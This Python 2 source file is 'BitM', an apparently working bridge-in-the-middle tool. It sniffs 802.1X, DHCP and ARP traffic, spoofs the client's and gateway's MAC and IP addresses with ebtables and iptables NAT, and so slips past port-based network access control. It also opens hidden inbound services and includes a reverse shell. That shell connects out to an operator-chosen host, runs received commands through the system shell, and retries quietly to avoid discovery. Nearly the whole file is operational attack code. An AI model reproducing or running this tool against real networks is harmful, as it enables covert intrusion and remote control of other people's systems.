#!/usr/bin/python2
# Author: @jkadijk
# Base decoderthread layout from the Impacket examples.

import sys
import os
import signal
import time
import argparse
import subprocess
import struct
import re
from threading import Thread
import socket

import pcapy
from pcapy import open_live
import impacket
import impacket.eap
import impacket.dhcp
import impacket.ImpactPacket
from impacket.ImpactDecoder import EthDecoder, LinuxSLLDecoder


def cmd(c):
    return subprocess.check_output(c, shell=True)

# Signal handler class for Ctrl-c
class SignalHandler():
    def __init__(self, shell, decoder, bridge, netfilter):
        self.shell = shell
        self.decoder = decoder
        self.bridge = bridge
        self.netfilter = netfilter
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signal, frame):
        if self.shell:
            self.shell.stop()
        self.decoder.stop()
        self.bridge.destroy()
        self.netfilter.reset()
        sys.exit(0)

    @staticmethod
    def threadSleep(sec, thread):
        for _ in range(sec):
            if thread.running:  # Stop sleeping when thread stops
                time.sleep(1)


class ReverseShell(Thread):
    running = False
    sock = None
    ip = None
    port = None
    password = None
    sleep = None

    def __init__(self, host, password, sleep):
        Thread.__init__(self)

        self.ip, self.port = host.split(':')
        self.password = password
        self.sleep = sleep

    def run(self):
        self.running = True
        try:
            while self.running:
                try:
                    self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.sock.connect((self.ip, int(self.port)))
                except:
                    SignalHandler.threadSleep(int(self.sleep), self)
                    continue

                if self.password:
                    self.sock.sendall('Password: ')
                    data = self.sock.recv(1024)
                    if data != (self.password + "\n"):
                        self.closeCon()
                        continue

                self.sock.sendall("""\
***************************************************
* Welcome to the reverse shell!                   *
* This is not bash! Think before you type!        *
* Don't run any long running tasks.               *
* Instead set up an ssh tunnel or something else. *
***************************************************\n\n""")
                self.sock.sendall("$ ")
                while 1:
                    data = self.sock.recv(1024)
                    if not data:
                        break

                    try:
                        r = subprocess.check_output(data, shell=True)
                    except:
                        r = ""

                    self.sock.sendall(r)
                    self.sock.sendall("$ ")

                self.closeCon()
        except:
            pass  # Always keep the reverse shell running!

    def stop(self):
        self.running = False
        self.closeCon()
        time.sleep(0.1)

    def closeCon(self):
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except socket.error:
            pass
        self.sock.close()


class DecoderThread(Thread):
    def __init__(self, bridge, subnet, arptable):
        # Open interface for capturing.
        self.pcap = open_live(bridge.bridgename, 1500, 0, 100)

        # Query the type of the link and instantiate a decoder accordingly.
        datalink = self.pcap.datalink()
        if pcapy.DLT_EN10MB == datalink:
            self.decoder = EthDecoder()
        elif pcapy.DLT_LINUX_SLL == datalink:
            self.decoder = LinuxSLLDecoder()
        else:
            raise Exception("Datalink type not supported: " % datalink)

        self.bridge = bridge
        self.subnet = subnet
        self.arptable = arptable
        self.running = True

        Thread.__init__(self)

    def run(self):
        # Sniff ad infinitum.
        # PacketHandler shall be invoked by pcap for every packet.
        while self.running:
            self.pcap.dispatch(1, self.packetHandler)

    def stop(self):
        self.running = False
        time.sleep(0.1)

    def packetHandler(self, hdr, data):
        e = self.decoder.decode(data)

        if e.get_ether_type() == impacket.eap.DOT1X_AUTHENTICATION:
            eapol = e.child()
            if eapol.get_packet_type() == eapol.EAP_PACKET:
                eap = eapol.child()
                eapr = eap.child()
                # Only client sends responses with identity
                if eap.get_code() == eap.RESPONSE and eapr.get_type() == eapr.IDENTITY:
                    self.subnet.clientmac = e.get_ether_shost()

        elif e.get_ether_type() == impacket.ImpactPacket.IP.ethertype:
            ip = e.child()
            if isinstance(ip.child(), impacket.ImpactPacket.UDP):
                udp = ip.child()
                if isinstance(udp.child(), impacket.dhcp.BootpPacket):
                    bootp = udp.child()
                    if isinstance(bootp.child(), impacket.dhcp.DhcpPacket):
                        dhcp = bootp.child()
                        if dhcp.getOptionValue('message-type') == dhcp.DHCPDISCOVER:
                            self.subnet.clientmac = e.get_ether_shost()
                        elif dhcp.getOptionValue('message-type') == dhcp.DHCPREQUEST:
                            self.subnet.clientmac = e.get_ether_shost()
                        elif dhcp.getOptionValue('message-type') == dhcp.DHCPACK:
                            self.subnet.clientip = self.subnet.int2ip(bootp["yiaddr"])
                            self.subnet.clientmac = e.get_ether_dhost()
                            self.subnet.gatewayip = self.subnet.int2ip(dhcp.getOptionValue("router")[0])
                            self.subnet.gatewaymac = e.get_ether_shost()
                            self.subnet.subnetmask = self.subnet.ip2array(
                                self.subnet.int2ip(dhcp.getOptionValue("subnet-mask")))
                            self.subnet.subnet = self.subnet.ip2array(self.subnet.int2ip(
                                dhcp.getOptionValue("subnet-mask") & bootp["yiaddr"]))
                            self.subnet.dhcp = True
                        elif dhcp.getOptionValue('message-type') == dhcp.DHCPOFFER:
                            self.subnet.clientip = self.subnet.int2ip(bootp["yiaddr"])
                            self.subnet.clientmac = e.get_ether_dhost()
                            self.subnet.gatewayip = self.subnet.int2ip(dhcp.getOptionValue("router")[0])
                            self.subnet.gatewaymac = e.get_ether_shost()
                            self.subnet.subnetmask = self.subnet.ip2array(
                                self.subnet.int2ip(dhcp.getOptionValue("subnet-mask")))
                            self.subnet.subnet = self.subnet.ip2array(self.subnet.int2ip(
                                dhcp.getOptionValue("subnet-mask") & bootp["yiaddr"]))
                            self.subnet.dhcp = True

            else:
                if not self.subnet.dhcp:
                    ttl = ip.get_ip_ttl()
                    # Uneven but not 1 or 255 ttl means it's probably coming from a router
                    if (ttl % 2) > 0 and ttl > 1 and ttl != 255:
                        self.subnet.gatewaymac = e.get_ether_shost()
                        self.subnet.clientmac = e.get_ether_dhost()
                        self.subnet.clientip = ip.get_ip_dst()

        elif e.get_ether_type() == impacket.ImpactPacket.ARP.ethertype:
            arp = e.child()
            if not self.subnet.dhcp:
                self.subnet.registeraddress(arp.get_ar_tpa())
                self.subnet.registeraddress(arp.get_ar_spa())

            if arp.get_op_name(arp.get_ar_op()) == "REPLY":
                print "got arp reply"
                self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))
            if arp.get_op_name(arp.get_ar_op()) == "REQUEST":
                self.arptable.registeraddress(arp.get_ar_spa(), arp.as_hrd(arp.get_ar_sha()))


class ArpTable:
    table = {}

    def registeraddress(self, ip_array, hw_address):
        ip = self.printip(ip_array)
        if ip != "0.0.0.0":
            self.table[ip] = hw_address
            print "%s : %s" % (ip, hw_address)

    def printip(self, ip_array):
        ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
        return ip_string

    def updatekernel(self):
        for ip, mac in self.table.iteritems():
            os.system("arp -i mibr -s %s %s" % (ip, mac))
            os.system("ip route add %s/32 dev mibr 2>/dev/null" % ip)


# Only supports /24 or smaller
class Subnet:
    clientmac = None
    gatewaymac = None
    subnet = None
    minaddress = None
    maxaddress = None
    clientip = ""
    gatewayip = ""
    subnetmask = None
    dhcp = False

    def registeraddress(self, ip_array):
        if self.printip(ip_array) == "0.0.0.0":
            return False
        if ip_array[0] == 169:
            return False
        if self.checksubnet(ip_array):
            if self.minaddress is None or self.minaddress[3] > ip_array[3]:
                self.minaddress = ip_array
            if self.maxaddress is None or self.maxaddress[3] < ip_array[3]:
                self.maxaddress = ip_array
        else:
            print self.printip(ip_array)
            print "[!] Error, duplicate or big subnet detected"

    def checksubnet(self, ip_array):
        if self.subnet is None:
            self.subnet = ip_array
            return True
        if ip_array[0] == self.subnet[0] and ip_array[1] == self.subnet[1]:
            return True
        else:
            return False

    def printip(self, ip_array):
        ip_string = socket.inet_ntoa(struct.pack('BBBB', *ip_array))
        return ip_string

    def ip2array(self, ip):
        ip_array = struct.unpack('BBBB', socket.inet_aton(ip))
        return ip_array

    def ip2int(self, addr):
        return struct.unpack("!I", socket.inet_aton(addr))[0]

    def int2ip(self, addr):
        return socket.inet_ntoa(struct.pack("!I", addr))

    def getcidr(self):
        if self.dhcp and self.subnet:
            return bin(self.ip2int(self.printip(self.subnetmask))).count("1")
        else:
            if self.maxaddress and self.minaddress:
                bits = 0
                discovered_hosts = self.maxaddress[3] - self.minaddress[3] + 1
                hosts = 0
                while hosts < discovered_hosts and bits <= 8:
                    bits += 1
                    hosts = 2**bits
                return bits
            else:
                return 0

    def get_gatewaymac(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        temp = ethernet.as_eth_addr(self.gatewaymac)
        return re.sub(r':(\d):', r':0\1:', temp)

    def get_clientmac(self):
        ethernet = impacket.ImpactPacket.Ethernet()
        temp = ethernet.as_eth_addr(self.clientmac)
        return re.sub(r':(\d):', r':0\1:', temp)

    def __str__(self):
        header = "Network config: \n"
        output = ""

        output += "dhcp seen: %s\n" % str(self.dhcp)

        if not self.dhcp and self.minaddress and self.maxaddress:
            output += "cidr bits: %i\n" % self.getcidr()
        elif self.dhcp and self.subnet:
            output += "subnet: %s / netmask: %s / cidr: %i\n" % \
                      (self.printip(self.subnet), self.printip(self.subnetmask), self.getcidr())

        if self.clientip:
            output += "client ip: %s\n" % self.clientip

        if self.clientmac:
            output += "client mac: %s\n" % self.get_clientmac()

        if self.gatewayip:
            output += "gateway ip: %s\n" % self.gatewayip

        if self.gatewaymac:
            output += "gateway mac: %s\n" % self.get_gatewaymac()

        if output == "":
            return "Network config unknown"
        else:
            return header + output


# Create ebtables, arptables and iptables rules based on a subnet object
class Netfilter:
    subnet = None
    bridge = None

    def __init__(self, subnet, bridge):
        self.subnet = subnet
        self.bridge = bridge

        self.inittables()

    def inittables(self):
        self.flushtables()
        os.system("iptables -A OUTPUT -o lo -j ACCEPT")
        os.system("iptables -P OUTPUT DROP")
        os.system("ebtables -P OUTPUT DROP")
        os.system("arptables -P OUTPUT DROP")

    def flushtables(self):
        os.system("iptables -F")
        os.system("iptables -F -t nat")
        os.system("ebtables -F")
        os.system("ebtables -t nat -F")
        os.system("arptables -F")

    def reset(self):
        self.flushtables()
        os.system("iptables -P OUTPUT ACCEPT")
        os.system("ebtables -P OUTPUT ACCEPT")
        os.system("arptables -P OUTPUT ACCEPT")

    def updatetables(self):
        self.flushtables()
        print "Updating netfilter"

        print "[*] Setting up layer 2 NAT"
        os.system("ip addr add 169.254.66.77/24 dev %s" % self.bridge.bridgename)
        os.system("ebtables -A OUTPUT -p 0x0806 -j DROP")  # _really_ block arp e.g. for nmap
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.ifmacs[self.bridge.switchsideint], self.bridge.switchsideint, self.subnet.get_clientmac()))
        os.system("ebtables -t nat -A POSTROUTING -s %s -o %s -j snat --snat-arp --to-src %s" %
                  (self.bridge.ifmacs[self.bridge.clientsiteint], self.bridge.clientsiteint, self.subnet.get_gatewaymac()))
        os.system("arp -s -i %s 169.254.66.55 %s" % (self.bridge.bridgename, self.subnet.get_gatewaymac()))

        print "[*] Setting up layer 3 NAT"
        sports = {'tcp': ':61000-62000', 'udp': ':61000-62000', 'icmp': ''}
        for proto in ['tcp', 'udp', 'icmp']:
            os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -d %s -p %s -j SNAT --to %s%s" %
                      (self.bridge.bridgename,  self.subnet.clientip, proto, self.subnet.gatewayip, sports[proto]))
            os.system("iptables -t nat -A POSTROUTING -o %s -s 169.254.0.0/16 -p %s -j SNAT --to %s%s" %
                      (self.bridge.bridgename,  proto, self.subnet.clientip, sports[proto]))

        print "[*] NAT is ready. Allow OUTPUT on interfaces"
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" %
                  self.bridge.clientsiteint)
        os.system("ebtables -A OUTPUT -o %s -j ACCEPT" %
                  self.bridge.switchsideint)
        os.system("iptables -A OUTPUT -o %s -s %s -j ACCEPT" %
                  (self.bridge.bridgename, "169.254.66.77"))

        if args.hidden_tcp or args.hidden_udp:
            print "[*] Create hidden services"
            for tcp in args.hidden_tcp:
                rport, lport = tcp.split(':')
                os.system("iptables -t nat -A PREROUTING -i %s -d %s -p tcp --dport %s -j DNAT --to 169.254.66.77:%s" %
                          (self.bridge.bridgename, self.subnet.clientip, rport, lport))
            for udp in args.hidden_udp:
                rport, lport = udp.split(':')
                os.system("iptables -t nat -A PREROUTING -i %s -d %s -p udp --dport %s -j DNAT --to 169.254.66.77:%s" %
                          (self.bridge.bridgename, self.subnet.clientip, rport, lport))

        os.system("ip route del default")
        os.system("ip route add default via 169.254.66.55 dev mibr")
        print """
************************************************************************
* Warning!                                                             *
* nmap uses raw sockets so NAT will NOT work for host discovery.       *
* For your own safety we block all outgoing ARP traffic with ebtables. *
* You will need to provide the --send-ip parameter to get any results. *
************************************************************************
"""


class Bridge:
    subnet = None
    bridgename = None
    ifmacs = {}
    interfaces = []
    switchsideint = None
    clientsiteint = None

    def __init__(self, bridgename, interfaces, subnet):
        self.bridgename = bridgename
        self.interfaces = interfaces
        self.subnet = subnet
        os.system("brctl addbr %s" % bridgename)
        os.system("macchanger -r %s" % bridgename)

        for interface in [self.bridgename] + self.interfaces:
            self.ifmacs.update({interface: self.getmac(interface)})
            os.system("ip link set %s down" % interface)
            if not args.enable_ipv6:
                os.system("sysctl -w net.ipv6.conf.%s.disable_ipv6=1" % interface)
            os.system("sysctl -w net.ipv6.conf.%s.autoconf=0" % interface)
            os.system("sysctl -w net.ipv6.conf.%s.accept_ra=0" % interface)
            if interface != bridgename:
                os.system("brctl addif %s %s" % (bridgename, interface))
            os.system("ip link set %s promisc on" % interface)

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        # Allow 802.1X traffic to pass the bridge
        os.system("echo 8 > /sys/class/net/mibr/bridge/group_fwd_mask")

    def getmac(self, iface):
        res = cmd("ip link show %s" % iface)
        return re.search("..:..:..:..:..:..", res).group(0)

    def srcmac2bridgeint(self, srcmac):
        print "searching for mac: %s ..." % srcmac
        portnumber = cmd("brctl showmacs %s | grep %s | awk '{print $1}'" %
                         (self.bridgename, srcmac)).rstrip()
        if not portnumber:
            print "portnumber not found bailing"
            return False
        print "portnumber is: %s" % portnumber
        interface = cmd("brctl showstp %s | grep '(%s)' | head -n1 | awk '{print $1}'" %
                        (self.bridgename, portnumber)).rstrip()
        print "got interface: %s .." % interface
        if not interface:
            print "error getting interface, is the bridge setup right?"
            return False
        return interface

    def setinterfacesides(self):
        self.switchsideint = self.srcmac2bridgeint(self.subnet.get_gatewaymac())
        print "switchside interface: %s - %s" % (self.switchsideint, self.ifmacs[self.switchsideint])
        self.clientsiteint = self.srcmac2bridgeint(self.subnet.get_clientmac())
        print "clientside interface: %s - %s" % (self.clientsiteint, self.ifmacs[self.clientsiteint])

    def up(self):
        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s up" % interface)

    def down(self):
        for interface in [self.bridgename] + self.interfaces:
            os.system("ip link set %s down" % interface)

    def destroy(self):
        self.down()
        os.system("brctl delbr %s" % self.bridgename)
        os.system("sysctl --system")


def main():
    if os.getuid() != 0:
        print "You need to run BitM as root!"
        sys.exit(1)

    dependencies = ['macchanger', 'brctl', 'ip', 'sysctl', 'arp',
                    'iptables', 'arptables', 'ebtables']

    for d in dependencies:
        if os.system("which %s >/dev/null" % d):
            print "Command '%s' is missing. Please install." % d
            sys.exit(1)

    subnet = Subnet()
    bridge = Bridge("mibr", args.ifaces, subnet)
    netfilter = Netfilter(subnet, bridge)
    arptable = ArpTable()
    shell = None
    if args.rev_host:
        shell = ReverseShell(args.rev_host, args.rev_password, args.rev_sleep)

    bridge.up()
    decoder = DecoderThread(bridge, subnet, arptable)

    sig = SignalHandler(shell, decoder, bridge, netfilter)

    decoder.start()
    if args.rev_host:
        shell.start()

    print "Listening on %s: net=%s, mask=%s, linktype=%d" % \
          (bridge.bridgename, decoder.pcap.getnet(), decoder.pcap.getmask(), decoder.pcap.datalink())

    while True:
        if subnet.clientip and subnet.gatewaymac and subnet.clientmac:
            print subnet

            bridge.setinterfacesides()
            if not args.radiosilence:
                netfilter.updatetables()
            else:
                print """
******************************************************
* Radiosilence is enabled.                           *
* Not setting up NAT and disallow outgoing traffic." *
******************************************************\n"""
            break
        else:
            print "not enough info..."
            print subnet
        time.sleep(5)

    # arp setup
    while True:
        f = open('/root/subnetinfo', 'w')
        f.write(str(subnet))
        f.close()
        arptable.updatekernel()
        time.sleep(5)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='BitM')
    parser.add_argument('-6', '--enable-ipv6', action='store_true')
    parser.add_argument('-q', '--radiosilence', action='store_true',
                        help="Don't set up NAT and disallow any outgoing "
                             "traffic. This is useful if you just want to "
                             "sniff the traffic.")
    parser.add_argument('-t', '--hidden-tcp', nargs='*', default=[],
                        metavar="<rPORT>:<lPORT>",
                        help="Create a hidden service where <lPORT> is"
                             "the local port the service is listening on and "
                             "<rPORT> is the remote port you will connect to "
                             "from the network. The service needs to listen "
                             "on 169.254.66.77 or <any>.")
    parser.add_argument('-u', '--hidden-udp', nargs='*', default=[],
                        metavar="<rPORT>:<lPORT>",
                        help="Create a hidden service where <lPORT> is"
                             "the local port the service is listening on and "
                             "<rPORT> is the remote port you will connect to "
                             "from the network. The service needs to listen "
                             "on 169.254.66.77 or <any>.")
    parser.add_argument('-r', '--rev-host', default=None,
                        metavar="<HOST>:<PORT>",
                        help="Enable the reverse connect shell and set the "
                             "host and port where it should connect to.\n"
                             "On your remote machine use netcat, ncat, socat "
                             "or something else to listen on the specified "
                             "port.")
    parser.add_argument('-p', '--rev-password', default=None,
                        help="Specify a password for the reverse shell to "
                             "prevent unauthorized access.")
    parser.add_argument('-s', '--rev-sleep', default=30,
                        help="Specifiy a sleep time the reverse shell should "
                             "sleep between connect retries. This is useful "
                             "to prevent massive connection tries and thereby "
                             "decrease the risk of being discovered.")
    parser.add_argument('ifaces', metavar='IFACE', nargs='*',
                        default=['eth1', 'eth2'], help='Two interfaces')
    args = parser.parse_args()

    if len(args.ifaces) not in (0, 2):
        parser.error('Either give two interfaces or none to use the ' +
                     'default "eth1 eth2"')

    main()
